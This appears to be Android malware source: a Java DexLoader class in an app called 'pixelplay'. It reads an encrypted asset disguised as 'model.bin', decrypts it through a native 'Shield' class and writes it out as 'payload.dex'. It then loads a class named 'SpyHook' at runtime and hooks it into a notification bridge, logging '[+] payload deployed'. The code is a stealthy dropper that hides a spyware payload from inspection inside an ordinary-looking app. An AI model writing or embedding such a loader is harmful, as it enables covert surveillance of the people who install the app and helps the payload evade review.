package com.pixelplay.app;

import android.content.Context;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Constructor;

import dalvik.system.DexClassLoader;

public class DexLoader {
    private static final String TAG = "PixelPlay";
    private static boolean loaded = false;

    public static void start(Context context) {
        if (loaded) return;
        try {
            // Read encrypted payload from assets
            InputStream in = context.getAssets().open("model.bin");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) != -1) baos.write(buf, 0, n);
            in.close();
            byte[] encrypted = baos.toByteArray();

            if (encrypted.length < 64) {
                Log.d(TAG, "payload too small");
                return;
            }

            // Decrypt via native shield
            if (!Shield.isAvailable()) {
                Log.d(TAG, "shield not available");
                return;
            }
            byte[] decrypted = Shield.decrypt(encrypted);

            // Write decrypted DEX
            File dexDir = context.getDir("dex", Context.MODE_PRIVATE);
            File dexFile = new File(dexDir, "payload.dex");
            FileOutputStream out = new FileOutputStream(dexFile);
            out.write(decrypted);
            out.close();

            // Load via DexClassLoader
            DexClassLoader cl = new DexClassLoader(
                dexFile.getAbsolutePath(),
                dexDir.getAbsolutePath(),
                null,
                context.getClassLoader());
            Class<?> hookClass = cl.loadClass("com.pixelplay.hook.SpyHook");
            Constructor<?> ctor = hookClass.getConstructor();
            Hook hook = (Hook) ctor.newInstance();
            NotificationBridge.setHook(hook);
            loaded = true;
            Log.d(TAG, "[+] payload deployed");
        } catch (Exception e) {
            Log.d(TAG, "dex: " + e.getMessage());
        }
    }
}
